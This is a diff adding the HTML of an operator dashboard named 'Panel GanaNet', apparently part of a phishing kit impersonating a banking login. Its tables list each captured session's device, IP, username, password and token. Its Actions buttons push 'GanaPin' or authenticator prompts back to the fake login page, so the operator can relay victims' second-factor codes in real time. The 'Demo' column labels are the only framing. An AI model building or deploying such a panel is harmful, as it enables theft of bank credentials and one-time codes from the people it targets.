@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <title>Panel GanaNet â€” operador</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/panel.css" />
+</head>
+<body>
+  <main class="dash">
+    <header class="toolbar">
+      <div class="toolbar__left">
+        <h1 class="toolbar__title">Panel GanaNet</h1>
+        <span class="toolbar__meta">Sesiones: <strong id="rowCount">0</strong> Â· usa GanaPin o Autenticador en Acciones</span>
+      </div>
+      <div class="toolbar__actions">
+        <button type="button" class="btn btn--ok" id="btnClean">Limpiar</button>
+        <a class="btn btn--ghost" href="../login.html">Ir al login</a>
+      </div>
+    </header>
+
+    <p class="empty is-visible" id="emptyState">
+      Cola vacÃ­a. En el login pulsa Verificar: el usuario llega aquÃ­ ordenado para elegir GanaPin o Autenticador.
+    </p>
+
+    <div class="sections" id="sections">
+      <section class="lane lane--1" data-lane="0">
+        <div class="lane__head">
+          <span class="lane__title">Azul</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="0"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--2" data-lane="1">
+        <div class="lane__head">
+          <span class="lane__title">Verde</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="1"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--3" data-lane="2">
+        <div class="lane__head">
+          <span class="lane__title">Rojo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="2"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--4" data-lane="3">
+        <div class="lane__head">
+          <span class="lane__title">Gris</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="3"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--5" data-lane="4">
+        <div class="lane__head">
+          <span class="lane__title">Amarillo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Demo user</th>
+              <th>Demo pass</th>
+              <th>Demo token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="4"></tbody>
+        </table>
+      </section>
+    </div>
+
+    <p class="footer-note" id="hint">
+      En Acciones: GanaPin o Autenticador envÃ­an el modal al login.
+    </p>
+  </main>
+
+  <script src="js/panel.js"></script>
+</body>
+</html>
